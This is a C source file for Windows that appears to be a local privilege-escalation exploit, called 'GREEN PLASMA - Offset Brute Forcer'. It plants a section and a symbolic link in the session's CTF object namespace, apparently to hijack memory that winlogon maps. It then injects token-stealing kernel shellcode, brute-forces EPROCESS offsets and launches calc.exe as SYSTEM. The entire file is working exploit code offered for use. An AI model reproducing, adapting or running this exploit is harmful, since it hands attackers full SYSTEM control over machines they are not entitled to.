#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

#ifndef SYMBOLIC_LINK_ALL_ACCESS
#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)
#endif

#ifndef ViewUnmap
#define ViewUnmap 2
#endif

#define SHELLCODE_SIZE 0x400
#define SC_WINEXEC_ADDR 0x200
#define SC_CMD_STRING 0x208

typedef NTSTATUS (NTAPI *pNtCreateSymbolicLinkObject)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PUNICODE_STRING);

typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T,
    PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);

typedef NTSTATUS (NTAPI *pNtClose)(HANDLE);
typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER,
    ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *pNtOpenSection)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS (NTAPI *pNtQuerySystemInformation)(
    ULONG, PVOID, ULONG, PULONG);

typedef struct {
    pNtCreateSymbolicLinkObject NtCreateSymbolicLinkObject;
    pNtMapViewOfSection        NtMapViewOfSection;
    pNtClose                   NtClose;
    pNtCreateSection           NtCreateSection;
    pNtOpenSection             NtOpenSection;
    pNtQuerySystemInformation  NtQuerySystemInformation;
} NT_FUNCS;

typedef struct {
    DWORD eprocess_links_offset;
    DWORD eprocess_pid_offset;
    DWORD eprocess_token_offset;
    DWORD thread_eprocess_offset;
} KRNL_OFFSETS;

static int init_nt_functions(NT_FUNCS *funcs) {
    ZeroMemory(funcs, sizeof(*funcs));
    
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;
    
    funcs->NtCreateSection = (pNtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
    funcs->NtCreateSymbolicLinkObject = (pNtCreateSymbolicLinkObject)GetProcAddress(ntdll, "NtCreateSymbolicLinkObject");
    funcs->NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
    funcs->NtClose = (pNtClose)GetProcAddress(ntdll, "NtClose");
    funcs->NtOpenSection = (pNtOpenSection)GetProcAddress(ntdll, "NtOpenSection");
    funcs->NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
    
    if (!funcs->NtCreateSection || !funcs->NtCreateSymbolicLinkObject || 
        !funcs->NtMapViewOfSection || !funcs->NtClose) {
        printf("[-] Failed to get NT functions\n");
        return 0;
    }
    
    printf("[+] NT functions ready\n");
    return 1;
}

// Simple shellcode that just tries to spawn calc with hardcoded offsets
static void build_shellcode_with_offsets(PBYTE buf, DWORD thread_offset, DWORD links_offset, DWORD pid_offset, DWORD token_offset, FARPROC winExec) {
    BYTE sc[] = {
        0x53, 0x51, 0x52, 0x56, 0x57, 0x55, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52,
        0x41, 0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x9C, 0x48,
        0x83, 0xEC, 0x28, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5D, 0x48, 0x81, 0xE5,
        0x00, 0xF0, 0xFF, 0xFF,
        0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,
        0x48, 0x8B, 0x40, 0x00,  // Thread offset placeholder
        0x49, 0x89, 0xC4,
        0x48, 0x8D, 0xB8, 0x00, 0x00, 0x00, 0x00,  // Links offset placeholder
        0x4D, 0x89, 0xFF,
        0xEB, 0x1B,
        0x48, 0x8B, 0x3F,
        0x4D, 0x39, 0xFF,
        0x74, 0x1A,
        0x48, 0x89, 0xF8,
        0x48, 0x83, 0xE8, 0x00,  // Links low byte placeholder
        0x4C, 0x39, 0xE0,
        0x74, 0xEA,
        0x48, 0x8B, 0x80, 0x00, 0x00, 0x00, 0x00,  // PID offset placeholder
        0x48, 0x83, 0xF8, 0x04,
        0x75, 0xE0,
        0x49, 0x89, 0xFD,
        0x49, 0x81, 0xED, 0x00, 0x00, 0x00, 0x00,  // Links offset placeholder 2
        0x49, 0x8B, 0x85, 0x00, 0x00, 0x00, 0x00,  // Token offset placeholder
        0x48, 0x25, 0xF0, 0xFF, 0xFF, 0xFF,
        0x49, 0x89, 0x84, 0x24, 0x00, 0x00, 0x00, 0x00,  // Token offset placeholder 2
        0x48, 0x8B, 0x85, 0x00, 0x02, 0x00, 0x00,
        0x48, 0x8D, 0x8D, 0x08, 0x02, 0x00, 0x00,
        0xBA, 0x01, 0x00, 0x00, 0x00,
        0x48, 0x83, 0xEC, 0x20,
        0xFF, 0xD0,
        0x48, 0x83, 0xC4, 0x20,
        0x48, 0x83, 0xC4, 0x28,
        0x9D,
        0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C,
        0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58,
        0x5D, 0x5F, 0x5E, 0x5A, 0x59, 0x5B, 0xC3
    };
    
    ZeroMemory(buf, SHELLCODE_SIZE);
    memcpy(buf, sc, sizeof(sc));
    
    // Patch offsets
    *(BYTE*)(buf + 0x2E) = (BYTE)thread_offset;
    *(DWORD*)(buf + 0x35) = links_offset;
    *(BYTE*)(buf + 0x42) = (BYTE)(links_offset & 0xFF);
    *(DWORD*)(buf + 0x4F) = pid_offset;
    *(DWORD*)(buf + 0x66) = links_offset;
    *(DWORD*)(buf + 0x6F) = token_offset;
    *(DWORD*)(buf + 0x7E) = token_offset;
    
    *(ULONG64*)(buf + SC_WINEXEC_ADDR) = (ULONG64)winExec;
    const char *cmd = "calc.exe";
    strcpy((char*)(buf + SC_CMD_STRING), cmd);
}

static DWORD get_session_id(void) {
    DWORD sid = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &sid);
    return sid;
}

static DWORD find_winlogon_pid(void) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    DWORD pid = 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) do {
        if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) { 
            pid = pe.th32ProcessID; 
            break; 
        }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return pid;
}

int main(void) {
    DWORD sessId = get_session_id();
    DWORD winlogonPid = find_winlogon_pid();
    NT_FUNCS nt = { 0 };
    
    printf("========================================\n");
    printf("GREEN PLASMA - Offset Brute Forcer\n");
    printf("========================================\n\n");
    
    printf("[+] Session: %u | Winlogon PID: %u\n", sessId, winlogonPid);
    
    if (!winlogonPid) {
        printf("[-] No winlogon.exe found\n");
        return 1;
    }
    
    if (!init_nt_functions(&nt)) {
        printf("[-] Failed to init NT functions\n");
        return 1;
    }
    
    // Create section
    HANDLE hSection = NULL;
    LARGE_INTEGER size = { .QuadPart = 0x1000 };
    UNICODE_STRING u;
    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    const wchar_t *sectionName = L"\\BaseNamedObjects\\CTFMON_DEAD";
    
    RtlInitUnicodeString(&u, sectionName);
    InitializeObjectAttributes(&oa, &u, OBJ_CASE_INSENSITIVE, NULL, NULL);
    
    NTSTATUS st = nt.NtCreateSection(&hSection, SECTION_ALL_ACCESS, &oa, &size,
                                      PAGE_READWRITE, SEC_COMMIT, NULL);
    if (st == 0xC0000035) {
        st = nt.NtOpenSection(&hSection, SECTION_ALL_ACCESS, &oa);
    }
    
    if (st < 0) {
        printf("[-] Section failed: 0x%08lX\n", st);
        return 1;
    }
    
    // Create symlink
    wchar_t symName[256];
    swprintf(symName, 256, L"\\Sessions\\%u\\BaseNamedObjects\\CTF.AsmListCache.FMPWinlogon%u", sessId, sessId);
    
    UNICODE_STRING uSym, uTarget;
    RtlInitUnicodeString(&uSym, symName);
    RtlInitUnicodeString(&uTarget, sectionName);
    
    HANDLE hSymlink = NULL;
    InitializeObjectAttributes(&oa, &uSym, OBJ_CASE_INSENSITIVE, NULL, NULL);
    
    st = nt.NtCreateSymbolicLinkObject(&hSymlink, SYMBOLIC_LINK_ALL_ACCESS, &oa, &uTarget);
    if (st == 0xC0000061) {
        InitializeObjectAttributes(&oa, &uSym, OBJ_CASE_INSENSITIVE, NULL, NULL);
        st = nt.NtOpenSection((PHANDLE)&hSymlink, DELETE, &oa);
        if (st >= 0) {
            nt.NtClose(hSymlink);
            hSymlink = NULL;
            InitializeObjectAttributes(&oa, &uSym, OBJ_CASE_INSENSITIVE, NULL, NULL);
            st = nt.NtCreateSymbolicLinkObject(&hSymlink, SYMBOLIC_LINK_ALL_ACCESS, &oa, &uTarget);
        }
    }
    
    if (st < 0) {
        printf("[-] Symlink failed: 0x%08lX\n", st);
        nt.NtClose(hSection);
        return 1;
    }
    
    // Map section
    PVOID viewBase = NULL;
    SIZE_T viewSize = 0x1000;
    st = nt.NtMapViewOfSection(hSection, GetCurrentProcess(),
        &viewBase, 0, 0x1000, NULL, &viewSize,
        ViewUnmap, 0, PAGE_READWRITE);
    if (st < 0) {
        printf("[-] MapView failed: 0x%08lX\n", st);
        nt.NtClose(hSection);
        nt.NtClose(hSymlink);
        return 1;
    }
    
    FARPROC we = GetProcAddress(GetModuleHandleA("kernel32.dll"), "WinExec");
    if (!we) {
        printf("[-] No WinExec\n");
        return 1;
    }
    
    // Brute force common offset ranges
    printf("[*] Brute forcing EPROCESS offsets...\n");
    printf("[*] This may take several minutes. Calculator will appear when correct.\n\n");
    
    DWORD thread_offsets[] = {0xB8, 0xC0, 0xB0};
    DWORD link_ranges[] = {0x440, 0x448, 0x450, 0x458, 0x460};
    DWORD token_ranges[] = {0x4B8, 0x4C0, 0x4C8, 0x4D0, 0x4D8};
    
    int found = 0;
    
    for (int t = 0; t < 3 && !found; t++) {
        for (int l = 0; l < 5 && !found; l++) {
            for (int tok = 0; tok < 5 && !found; tok++) {
                DWORD thread_off = thread_offsets[t];
                DWORD links_off = link_ranges[l];
                DWORD pid_off = links_off - 8;
                DWORD token_off = token_ranges[tok];
                
                printf("[*] Testing: Thread+%X Links+%X Pid+%X Token+%X\n", 
                       thread_off, links_off, pid_off, token_off);
                
                BYTE sc[SHELLCODE_SIZE];
                build_shellcode_with_offsets(sc, thread_off, links_off, pid_off, token_off, we);
                
                ZeroMemory(viewBase, 0x1000);
                memcpy((PBYTE)viewBase + 0x200, sc, SHELLCODE_SIZE);
                *(ULONG64*)((PBYTE)viewBase + 0x08) = (ULONG64)((PBYTE)viewBase + 0x200);
                
                SwitchDesktop(GetThreadDesktop(GetCurrentThreadId()));
                Sleep(2000);
                
                // Check if calc appeared
                HWND hWnd = FindWindowA(NULL, "Calculator");
                if (hWnd) {
                    printf("\n[+] SUCCESS! Calculator opened as SYSTEM!\n");
                    printf("[+] Correct offsets: Thread+%X Links+%X Pid+%X Token+%X\n",
                           thread_off, links_off, pid_off, token_off);
                    found = 1;
                    break;
                }
            }
        }
    }
    
    if (!found) {
        printf("\n[-] No working offsets found.\n");
        printf("[!] Your Windows 11 build may have different EPROCESS structure.\n");
        printf("[!] Try running on Windows 10 1903 VM instead.\n");
    }
    
    nt.NtClose(hSection);
    nt.NtClose(hSymlink);
    
    printf("\n[*] Press Enter to exit\n");
    getchar();
    return 0;
}
